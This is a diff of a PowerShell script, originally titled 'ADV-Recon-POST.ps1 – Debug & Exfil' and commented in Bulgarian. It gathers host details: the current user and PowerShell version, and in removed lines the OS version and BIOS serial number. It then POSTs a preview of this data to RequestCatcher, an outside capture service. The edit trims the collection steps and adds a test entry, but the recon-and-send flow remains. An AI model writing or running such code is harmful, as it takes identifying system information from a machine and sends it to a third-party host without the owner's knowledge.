@@ -1,5 +1,4 @@
-# =================== ADV-Recon-POST.ps1 – Debug & Exfil ===================
-
+# ========== Инициализация ==========
 $output = ""
 
 function Add-ToOutput {
@@ -8,33 +7,19 @@ function Add-ToOutput {
     $output += "$($Data | Out-String)`n"
 }
 
-# ----------------- Събиране на примерна информация -------------------
-
+# ========== Тестова секция ==========
+Add-ToOutput "Test Block" "This is a test entry."
 Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
 Add-ToOutput "Current User" (whoami)
 
-# Примерна информация от системата
-try {
-    $os = Get-CimInstance Win32_OperatingSystem
-    Add-ToOutput "Operating System" "$($os.Caption) $($os.Version)"
-} catch {
-    Add-ToOutput "Operating System" "ERROR: $($_.Exception.Message)"
-}
-
-try {
-    $bios = Get-CimInstance Win32_BIOS
-    Add-ToOutput "BIOS Serial Number" $bios.SerialNumber
-} catch {
-    Add-ToOutput "BIOS Info" "ERROR: $($_.Exception.Message)"
-}
-
-# ----------------- DEBUG – показване на събраното -------------------
-
-Write-Host "`n======== DEBUG PREVIEW ========"
+# ========== DEBUG: Показване на съдържание ==========
+Write-Host "`n========== DEBUG =========="
+Write-Host "OUTPUT LENGTH: $($output.Length)"
+Write-Host "OUTPUT CONTENT:"
 Write-Host $output
-Write-Host "======== END OF DEBUG ========="
+Write-Host "==========================="
 
-# ----------------- POST към RequestCatcher с правилен формат -------------------
+# ========== POST към RequestCatcher ==========
 try {
     $preview = $output.Substring(0, [Math]::Min(500, $output.Length))
     $body = @{ debug = $preview }
@@ -46,5 +31,3 @@ try {
 } catch {
     Write-Host "`nPOST FAILED: $($_.Exception.Message)"
 }
-
-
